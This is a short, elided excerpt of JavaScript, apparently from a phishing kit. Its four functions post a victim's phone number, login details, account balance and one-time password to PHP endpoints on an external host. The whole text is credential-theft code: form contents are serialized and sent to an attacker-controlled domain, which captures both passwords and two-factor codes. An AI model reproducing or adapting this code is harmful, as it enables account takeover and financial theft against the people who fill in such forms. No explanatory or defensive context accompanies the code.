function sendHp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/tetek/no.php',
...
function sendLogin() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/tetek/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/tetek/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/tetek/otp.php',
